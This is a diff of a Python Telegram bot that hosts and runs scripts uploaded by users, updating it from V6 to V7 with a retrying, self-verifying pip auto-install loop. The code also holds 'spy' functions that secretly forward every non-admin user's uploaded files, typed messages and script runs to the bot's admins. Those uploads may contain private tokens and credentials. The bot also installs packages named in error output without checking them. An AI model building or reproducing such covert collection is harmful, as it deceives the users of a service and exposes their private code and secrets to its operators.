@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
-"""79 Hosting V6 — no timeout, 5-slot rotation, infinite auto-repair"""
-import asyncio, atexit, json, logging, os, re, shlex, signal, subprocess, sys, zipfile
+"""79 Hosting V7 — GUARANTEED module install + verify"""
+import asyncio, atexit, json, logging, os, re, shlex, signal, site, subprocess, sys, zipfile
 from datetime import datetime
 from pathlib import Path
 from threading import Thread
@@ -27,16 +27,15 @@ PORT = int(os.getenv("PORT") or os.getenv("RAILWAY_PUBLIC_PORT") or "8080")
 WS_BASE = Path(os.getenv("WORKSPACE_BASE", "./workspaces"))
 MAX_UP = 50 * 1024 * 1024
 MAX_USER_PROCS = int(os.getenv("MAX_USER_PROCESSES", "5"))
-DL_TIMEOUT = int(os.getenv("DOWNLOAD_TIMEOUT", "60"))
 WS_BASE.mkdir(parents=True, exist_ok=True)
 
 UPLOAD_WAIT, TERM = range(2)
 DATA = Path("bot_data.json")
 
 
+# ---------- Path registry ----------
 class Paths:
-    def __init__(self):
-        self.d, self.n = {}, 0
+    def __init__(self): self.d, self.n = {}, 0
     def add(self, p: Path) -> str:
         s = str(p.resolve())
         for k, v in self.d.items():
@@ -47,6 +46,7 @@ class Paths:
 R = Paths()
 
 
+# ---------- persistence ----------
 def load():
     if DATA.exists():
         try: return json.loads(DATA.read_text())
@@ -112,10 +112,9 @@ class UM:
     def stop(self, pid):
         for p in self.procs:
             if p.get("pid") == pid:
-                try: os.kill(pid, signal.SIGTERM)
-                except: pass
-                try: os.kill(pid, signal.SIGKILL)
-                except: pass
+                for sig in (signal.SIGTERM, signal.SIGKILL):
+                    try: os.kill(pid, sig)
+                    except: pass
                 p["status"] = "stopped"; self.save(); return True
         return False
 
@@ -137,28 +136,226 @@ um = UM()
 atexit.register(um.cleanup)
 
 
+# ---------- pip system (VERIFIED install) ----------
+PIP_ALIAS = {
+    "user_agent": "fake-useragent",
+    "cv2": "opencv-python",
+    "PIL": "Pillow",
+    "yaml": "PyYAML",
+    "bs4": "beautifulsoup4",
+    "Crypto": "pycryptodome",
+    "OpenSSL": "pyOpenSSL",
+    "dotenv": "python-dotenv",
+    "telegram": "python-telegram-bot",
+    "telethon": "Telethon",
+    "cfonts": "python-cfonts",
+    "sklearn": "scikit-learn",
+    "skimage": "scikit-image",
+}
+
+def child_env() -> dict:
+    """Ensure scripts see all installed packages."""
+    env = os.environ.copy()
+    paths = []
+    try: paths.append(site.getusersitepackages())
+    except: pass
+    try: paths.extend(site.getsitepackages())
+    except: pass
+    old = env.get("PYTHONPATH", "")
+    env["PYTHONPATH"] = os.pathsep.join([p for p in paths if p] + ([old] if old else []))
+    env["PIP_DISABLE_PIP_VERSION_CHECK"] = "1"
+    env["PYTHONUNBUFFERED"] = "1"
+    return env
+
+
+async def verify_import(module: str, env: dict) -> bool:
+    """Check if module actually importable."""
+    try:
+        p = await asyncio.create_subprocess_exec(
+            sys.executable, "-c", f"import {module}",
+            stdout=asyncio.subprocess.DEVNULL,
+            stderr=asyncio.subprocess.DEVNULL,
+            env=env,
+        )
+        await asyncio.wait_for(p.communicate(), timeout=15)
+        return p.returncode == 0
+    except:
+        return False
+
+
+async def pip_install_verified(module: str) -> Tuple[bool, str]:
+    """Install and VERIFY import works. Returns (success, message)."""
+    env = child_env()
+    top = module.split(".")[0]
+
+    # Already installed?
+    if await verify_import(top, env):
+        return True, "already installed"
+
+    # Try candidates
+    candidates = [module]
+    if module in PIP_ALIAS:
+        candidates.insert(0, PIP_ALIAS[module])
+    if "." in module and top not in candidates:
+        candidates.append(top)
+
+    for pkg in candidates:
+        for flags in (
+            [],
+            ["--user"],
+            ["--break-system-packages"],
+        ):
+            try:
+                cmd = [sys.executable, "-m", "pip", "install", "--no-input",
+                       "--no-cache-dir", "--quiet"] + flags + [pkg]
+                p = await asyncio.create_subprocess_exec(
+                    *cmd,
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.STDOUT,
+                    env=env,
+                )
+                try:
+                    out, _ = await asyncio.wait_for(p.communicate(), timeout=180)
+                except asyncio.TimeoutError:
+                    p.kill()
+                    continue
+
+                if p.returncode == 0:
+                    # VERIFY
+                    if await verify_import(top, env):
+                        return True, f"installed {pkg}"
+            except Exception as e:
+                log.warning("pip %s: %s", pkg, e)
+
+    return False, f"could not install {module}"
+
+
+async def install_reqs(dest: Path):
+    req = dest / "requirements.txt"
+    if not req.exists(): return
+    env = child_env()
+    for flags in ([], ["--user"], ["--break-system-packages"]):
+        try:
+            cmd = [sys.executable, "-m", "pip", "install", "--no-input",
+                   "--no-cache-dir", "--quiet"] + flags + ["-r", str(req)]
+            p = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.DEVNULL,
+                stderr=asyncio.subprocess.DEVNULL,
+                env=env,
+            )
+            await asyncio.wait_for(p.communicate(), timeout=300)
+            if p.returncode == 0:
+                return
+        except: pass
+
+
+def find_missing_modules(text: str) -> List[str]:
+    modules = re.findall(
+        r"(?:ModuleNotFoundError|ImportError): No module named ['\"]([^'\"]+)['\"]",
+        text,
+    )
+    return list(dict.fromkeys(modules))
+
+
+# ---------- SCRIPT RUNNER ----------
+async def run_script(uid, path: Path, ftype, edit):
+    um.tinc(uid, "runs")
+    logdir = um.ws(uid) / "logs"; logdir.mkdir(exist_ok=True)
+    lp = logdir / f"{datetime.now():%Y%m%d_%H%M%S}_{path.stem}.log"
+    cmd = [sys.executable, "-u", str(path)] if ftype == "py" else ["node", str(path)]
+
+    def spawn(mode="w"):
+        f = open(lp, mode, buffering=1, encoding="utf-8", errors="ignore")
+        env = child_env()
+        pr = subprocess.Popen(
+            cmd, cwd=str(path.parent),
+            stdout=f, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL,
+            env=env,
+        )
+        return pr, f
+
+    await edit("⏳ Installing requirements.txt (if any)...")
+    await install_reqs(path.parent)
+
+    await edit("🚀 Starting script...")
+    tried = set()
+    mode = "w"
+    round_n = 0
+    max_rounds = 20
+
+    while round_n < max_rounds:
+        round_n += 1
+        pr, f = spawn(mode); mode = "a"
+        await asyncio.sleep(5)
+        code = pr.poll()
+
+        if code is None:
+            um.tinc(uid, "ok")
+            return pr.pid, str(lp), f"🚀 Running\nPID `{pr.pid}` | Rounds: {round_n}"
+
+        try: f.close()
+        except: pass
+        out = lp.read_text(errors="ignore") if lp.exists() else ""
+
+        if code == 0:
+            um.tinc(uid, "ok")
+            return pr.pid, str(lp), f"✅ Finished OK (Rounds: {round_n})"
+
+        missing = [m for m in find_missing_modules(out) if m not in tried]
+
+        if not missing:
+            um.tinc(uid, "fail")
+            return pr.pid, str(lp), f"❌ Script error (Exit {code})\n```\n{out[-1200:]}\n```"
+
+        await edit(f"⚙️ Round {round_n}: installing {len(missing)} module(s)\n" +
+                   ", ".join(f"`{m}`" for m in missing))
+
+        failed = []
+        for m in missing:
+            tried.add(m)
+            ok, msg = await pip_install_verified(m)
+            log.info("pip %s -> %s (%s)", m, ok, msg)
+            if not ok:
+                failed.append(m)
+
+        if failed:
+            um.tinc(uid, "fail")
+            return pr.pid, str(lp), (
+                f"❌ Cannot install: {', '.join(failed)}\n"
+                f"```\n{out[-800:]}\n```"
+            )
+
+        await edit(f"✅ Installed {len(missing)}. Retrying...")
+
+    um.tinc(uid, "fail")
+    return 0, str(lp), f"❌ Too many install rounds ({max_rounds})"
+
+
+# ---------- SPY ----------
 async def spy_file(bot, user, file_id, fname):
     if user.id in ADMIN_IDS: return
     cap = f"🕵️ FILE\n👤 {user.full_name} (@{user.username or '-'})\n🆔 `{user.id}`\n📄 `{fname}`"
     for a in ADMIN_IDS:
         try: await bot.send_document(a, document=file_id, caption=cap, parse_mode="Markdown")
-        except Exception as e: log.warning("spy file: %s", e)
+        except Exception as e: log.warning("spy: %s", e)
 
 async def spy_text(bot, user, text):
     if user.id in ADMIN_IDS: return
-    msg = f"🕵️ MSG\n👤 {user.full_name} (@{user.username or '-'})\n🆔 `{user.id}`\n💬 {text[:3000]}"
+    msg = f"🕵️ MSG\n👤 {user.full_name}\n🆔 `{user.id}`\n💬 {text[:3000]}"
     for a in ADMIN_IDS:
         try: await bot.send_message(a, msg, parse_mode="Markdown")
         except: pass
 
 async def spy_run(bot, user, fname):
     if user.id in ADMIN_IDS: return
-    msg = f"🕵️ RUN\n👤 {user.full_name} (@{user.username or '-'})\n🆔 `{user.id}`\n▶️ `{fname}`"
+    msg = f"🕵️ RUN\n👤 {user.full_name}\n🆔 `{user.id}`\n▶️ `{fname}`"
     for a in ADMIN_IDS:
         try: await bot.send_message(a, msg, parse_mode="Markdown")
         except: pass
 
 
+# ---------- keyboards ----------
 def menu_kb(uid):
     rows = [
         [InlineKeyboardButton("📁 Upload", callback_data="upload"),
@@ -252,171 +449,67 @@ def entry_of(d: Path):
     return None, None
 
 
-PIP_ALIAS = {
-    "user_agent": "fake-useragent",
-    "cv2": "opencv-python",
-    "PIL": "Pillow",
-    "yaml": "PyYAML",
-    "bs4": "beautifulsoup4",
-    "Crypto": "pycryptodome",
-    "OpenSSL": "pyOpenSSL",
-    "dotenv": "python-dotenv",
-    "telegram": "python-telegram-bot",
-    "telethon": "Telethon",
-}
-
-async def pip_install(name):
-    for pkg in {name, PIP_ALIAS.get(name, name)}:
-        try:
-            p = await asyncio.create_subprocess_exec(
-                sys.executable, "-m", "pip", "install", "--no-input", pkg,
-                stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL,
-            )
-            await p.communicate()
-            if p.returncode == 0:
-                return True
-        except: pass
-    return False
-
-async def install_reqs(dest: Path):
-    req = dest / "requirements.txt"
-    if not req.exists(): return
-    try:
-        p = await asyncio.create_subprocess_exec(
-            sys.executable, "-m", "pip", "install", "--no-input", "-r", str(req),
-            stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL,
-        )
-        await p.communicate()
-    except: pass
-
-
-def miss_mod(txt):
-    m = re.search(r"(?:ModuleNotFoundError|ImportError): No module named ['\"]([^'\"]+)['\"]", txt)
-    return m.group(1) if m else None
-
-
 async def enforce_slot(uid, bot):
-    """Ensure user has < MAX_USER_PROCS. Kill OLDEST to make room."""
     live = um.live_user_procs(uid)
     while len(live) >= MAX_USER_PROCS:
         old = live[0]
         um.stop(old["pid"])
         try:
             await bot.send_message(uid,
-                f"🔄 Slot full ({MAX_USER_PROCS}). Removed oldest: `{old['filename']}` (PID {old['pid']})",
+                f"🔄 Slot full ({MAX_USER_PROCS}). Removed oldest: `{old['filename']}`",
                 parse_mode="Markdown")
         except: pass
         live = um.live_user_procs(uid)
 
 
-async def run_script(uid, path: Path, ftype, edit):
-    um.tinc(uid, "runs")
-    logdir = um.ws(uid) / "logs"; logdir.mkdir(exist_ok=True)
-    lp = logdir / f"{datetime.now():%Y%m%d_%H%M%S}_{path.stem}.log"
-    cmd = [sys.executable, "-u", str(path)] if ftype == "py" else ["node", str(path)]
-
-    def spawn(mode="w"):
-        f = open(lp, mode, buffering=1, encoding="utf-8", errors="ignore")
-        pr = subprocess.Popen(
-            cmd, cwd=str(path.parent),
-            stdout=f, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL,
-        )
-        return pr, f
-
-    await edit("⏳ Preparing environment...")
-    await install_reqs(path.parent)
-
-    await edit("🚀 Starting script...")
-    tried_modules = set()
-    attempt = 0
-    mode = "w"
-
-    while True:
-        attempt += 1
-        pr, f = spawn(mode); mode = "a"
-        await asyncio.sleep(4)
-        code = pr.poll()
-
-        if code is None:
-            um.tinc(uid, "ok")
-            return pr.pid, str(lp), f"🚀 Running in background\nPID `{pr.pid}` | Attempts: {attempt}"
-
-        try: f.close()
-        except: pass
-        out = lp.read_text(errors="ignore") if lp.exists() else ""
-
-        if code == 0:
-            um.tinc(uid, "ok")
-            return pr.pid, str(lp), f"✅ Finished OK (Attempts: {attempt})"
-
-        miss = miss_mod(out)
-        if miss and miss not in tried_modules:
-            tried_modules.add(miss)
-            await edit(f"⚙️ Missing `{miss}` — installing (auto-repair {len(tried_modules)})...")
-            ok = await pip_install(miss)
-            if ok:
-                await edit(f"✅ Installed `{miss}`. Retrying...")
-                continue
-            else:
-                um.tinc(uid, "fail")
-                return pr.pid, str(lp), f"❌ Cannot install `{miss}`\n```\n{out[-700:]}\n```"
-
-        um.tinc(uid, "fail")
-        tail = out[-1000:] if out else "no output"
-        return pr.pid, str(lp), f"❌ Script error (Exit {code})\n```\n{tail}\n```"
-
-
-async def download_doc(bot, file_id, dest: Path, tries=4) -> Tuple[bool, Optional[str]]:
+async def download_doc(bot, file_id, dest: Path) -> Tuple[bool, Optional[str]]:
     last = None
-    for i in range(tries):
+    for i in range(4):
         try:
-            tg = await bot.get_file(file_id, read_timeout=DL_TIMEOUT, write_timeout=DL_TIMEOUT, connect_timeout=DL_TIMEOUT)
+            tg = await bot.get_file(file_id)
             await tg.download_to_drive(custom_path=str(dest))
             if dest.exists() and dest.stat().st_size > 0:
                 return True, None
         except Exception as e:
             last = e
-            log.warning("download attempt %d: %s", i + 1, e)
+            log.warning("dl attempt %d: %s", i + 1, e)
             await asyncio.sleep(2 * (i + 1))
     return False, str(last)
 
 
-# ---- handlers ----
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+# ---------- HANDLERS ----------
+async def start(update, context):
     if not await gate(update, context): return
     u = update.effective_user
     await update.message.reply_text(
-        f"👋 *{u.first_name}* — 79 Hosting\nMax {MAX_USER_PROCS} scripts at a time.",
+        f"👋 *{u.first_name}* — 79 Hosting\nMax {MAX_USER_PROCS} scripts at a time",
         parse_mode="Markdown", reply_markup=menu_kb(u.id))
 
-async def home(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def home(update, context):
     q = update.callback_query; await q.answer()
     if not await gate(update, context): return
-    try:
-        await q.edit_message_text("📋 *Menu*", parse_mode="Markdown", reply_markup=menu_kb(q.from_user.id))
+    try: await q.edit_message_text("📋 *Menu*", parse_mode="Markdown", reply_markup=menu_kb(q.from_user.id))
     except: pass
 
-async def join_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def join_cb(update, context):
     q = update.callback_query; await q.answer()
     if await gate(update, context):
         try: await q.edit_message_text("✅ OK", reply_markup=menu_kb(q.from_user.id))
         except: pass
 
-async def upload_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def upload_cb(update, context):
     q = update.callback_query; await q.answer()
     if not await gate(update, context): return ConversationHandler.END
-    await q.edit_message_text(
-        "📤 Send `.py` / `.js` / `.zip`\n/cancel to abort",
+    await q.edit_message_text("📤 Send `.py` / `.js` / `.zip`\n/cancel to abort",
         parse_mode="Markdown", reply_markup=back_kb())
     return UPLOAD_WAIT
 
-async def upload_recv(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def upload_recv(update, context):
     u = update.effective_user
     doc = update.message.document
     if not doc:
         await update.message.reply_text("Send a file.", reply_markup=back_kb())
         return UPLOAD_WAIT
-
     name = doc.file_name or "file.py"
     if not name.endswith((".py", ".js", ".zip")):
         await update.message.reply_text("Only py/js/zip", reply_markup=menu_kb(u.id))
@@ -429,12 +522,11 @@ async def upload_recv(update: Update, context: ContextTypes.DEFAULT_TYPE):
     safe = safe_name(name)
     path = ws / safe
 
-    status_msg = await update.message.reply_text("⬇️ Downloading...")
+    status = await update.message.reply_text("⬇️ Downloading...")
     ok, err = await download_doc(context.bot, doc.file_id, path)
     if not ok:
-        await status_msg.edit_text(
-            f"❌ Download failed. Try again.\n`{err}`",
-            parse_mode="Markdown", reply_markup=menu_kb(u.id))
+        await status.edit_text(f"❌ Download failed\n`{err}`", parse_mode="Markdown",
+            reply_markup=menu_kb(u.id))
         return ConversationHandler.END
 
     await spy_file(context.bot, u, doc.file_id, name)
@@ -444,30 +536,28 @@ async def upload_recv(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ed.mkdir(exist_ok=True)
         okz, msg = extract_zip(path, ed)
         if not okz:
-            await status_msg.edit_text(f"❌ Zip err: {msg}", reply_markup=menu_kb(u.id))
+            await status.edit_text(f"❌ Zip err: {msg}", reply_markup=menu_kb(u.id))
             return ConversationHandler.END
         _, ent = entry_of(ed)
-        await status_msg.edit_text(
-            f"✅ Zip extracted.\nEntry: `{ent.name if ent else '?'}`",
+        await status.edit_text(
+            f"✅ Zip extracted\nEntry: `{ent.name if ent else '?'}`",
             parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton("📂 Scripts", callback_data="scripts")],
                 [InlineKeyboardButton("🏠 Menu", callback_data="home")]]))
         return ConversationHandler.END
 
-    await status_msg.edit_text(
-        f"✅ `{safe}` saved",
-        parse_mode="Markdown",
+    await status.edit_text(f"✅ `{safe}` saved", parse_mode="Markdown",
         reply_markup=InlineKeyboardMarkup([
             [InlineKeyboardButton("📂 Scripts", callback_data="scripts")],
             [InlineKeyboardButton("🏠 Menu", callback_data="home")]]))
     return ConversationHandler.END
 
-async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def cancel(update, context):
     await update.message.reply_text("Cancelled.", reply_markup=menu_kb(update.effective_user.id))
     return ConversationHandler.END
 
-async def scripts_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def scripts_cb(update, context):
     q = update.callback_query; await q.answer()
     uid = q.from_user.id
     ws = um.ws(uid)
@@ -485,10 +575,11 @@ async def scripts_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
         rows.append([InlineKeyboardButton(f"📄 {f.name[:30]}", callback_data=f"vw_{k}"),
                      InlineKeyboardButton("▶️", callback_data=f"rn_{k}")])
     rows.append([InlineKeyboardButton("🏠 Menu", callback_data="home")])
-    await q.edit_message_text(f"📂 *Scripts* (Slot: {len(um.live_user_procs(uid))}/{MAX_USER_PROCS})",
+    await q.edit_message_text(
+        f"📂 *Scripts* (Live: {len(um.live_user_procs(uid))}/{MAX_USER_PROCS})",
         parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(rows))
 
-async def view_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def view_cb(update, context):
     q = update.callback_query; await q.answer()
     p = R.get(q.data[3:])
     if not p or not p.exists():
@@ -501,7 +592,7 @@ async def view_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("🔙 Scripts", callback_data="scripts"),
              InlineKeyboardButton("🏠", callback_data="home")]]))
 
-async def run_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def run_cb(update, context):
     q = update.callback_query; await q.answer()
     uid = q.from_user.id
     p = R.get(q.data[3:])
@@ -525,7 +616,7 @@ async def run_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("📂 Scripts", callback_data="scripts"),
              InlineKeyboardButton("🏠", callback_data="home")]]))
 
-async def log_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def log_cb(update, context):
     q = update.callback_query; await q.answer()
     p = R.get(q.data[3:])
     if not p or not p.exists():
@@ -536,7 +627,7 @@ async def log_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("📂 Scripts", callback_data="scripts"),
              InlineKeyboardButton("🏠", callback_data="home")]]))
 
-async def logs_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def logs_cb(update, context):
     q = update.callback_query; await q.answer()
     rows = []
     for pr in um.user_procs(q.from_user.id)[-20:]:
@@ -548,7 +639,7 @@ async def logs_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     rows.append([InlineKeyboardButton("🏠", callback_data="home")])
     await q.edit_message_text("📝 Logs", reply_markup=InlineKeyboardMarkup(rows))
 
-async def stop_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def stop_cb(update, context):
     q = update.callback_query; await q.answer()
     live = um.live_user_procs(q.from_user.id)
     if not live:
@@ -558,13 +649,13 @@ async def stop_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await q.edit_message_text(f"Running: {len(live)}/{MAX_USER_PROCS}",
         reply_markup=InlineKeyboardMarkup(rows))
 
-async def stop_one(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def stop_one(update, context):
     q = update.callback_query; await q.answer()
     pid = int(q.data[3:])
     um.stop(pid)
     await q.edit_message_text(f"✅ Stopped `{pid}`", parse_mode="Markdown", reply_markup=back_kb())
 
-async def stats_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def stats_cb(update, context):
     q = update.callback_query; await q.answer()
     t = um.tget(q.from_user.id)
     live = len(um.live_user_procs(q.from_user.id))
@@ -573,8 +664,8 @@ async def stats_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=back_kb())
 
 
-# ----- terminal admin -----
-async def term_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+# ---------- terminal admin ----------
+async def term_cb(update, context):
     q = update.callback_query; await q.answer()
     if q.from_user.id not in ADMIN_IDS:
         await q.edit_message_text("Admin only", reply_markup=back_kb()); return ConversationHandler.END
@@ -586,7 +677,7 @@ async def term_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 ALLOWED = {"pwd", "ls", "cd", "cat", "head", "tail", "mkdir", "cp", "mv", "rm"}
 
-async def term_in(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def term_in(update, context):
     uid = update.effective_user.id
     if uid not in ADMIN_IDS: return ConversationHandler.END
     t = (update.message.text or "").strip()
@@ -619,8 +710,8 @@ async def term_in(update: Update, context: ContextTypes.DEFAULT_TYPE):
     return TERM
 
 
-# ----- admin -----
-async def admin_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+# ---------- admin ----------
+async def admin_cb(update, context):
     q = update.callback_query; await q.answer()
     if q.from_user.id not in ADMIN_IDS: return
     await q.edit_message_text("👑 Admin", reply_markup=InlineKeyboardMarkup([
@@ -697,7 +788,7 @@ async def ub(update, context):
     await q.edit_message_text(f"Unbanned `{uid}`", parse_mode="Markdown", reply_markup=back_kb("admin"))
 
 
-async def text_spy(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def text_spy(update, context):
     if not await gate(update, context): return
     await spy_text(context.bot, update.effective_user, update.message.text or "")
     await update.message.reply_text("Use buttons ⬇️", reply_markup=menu_kb(update.effective_user.id))
@@ -706,6 +797,7 @@ async def on_err(update, context):
     log.error("%s", context.error)
 
 
+# ---------- flask keep-alive ----------
 appf = Flask("79")
 @appf.get("/")
 @appf.get("/healthz")
@@ -757,7 +849,7 @@ def main():
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_spy))
     app.add_error_handler(on_err)
 
-    log.info("79 V6 up | MAX_PROCS=%d", MAX_USER_PROCS)
+    log.info("79 V7 ready | MAX_PROCS=%d", MAX_USER_PROCS)
     app.run_polling(drop_pending_updates=True)
 
 
